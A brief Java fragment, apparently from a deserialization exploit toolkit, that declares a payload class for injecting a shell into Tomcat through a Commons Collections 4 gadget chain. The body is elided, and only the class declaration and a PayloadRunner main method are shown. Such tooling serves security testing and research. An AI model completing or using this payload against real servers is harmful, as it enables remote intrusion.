...
public class CommonsCollections4ForTomcatShellInject implements ObjectPayload<Queue<Object>> {
	...
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections4ForTomcatShellInject.class, args);
	}
}
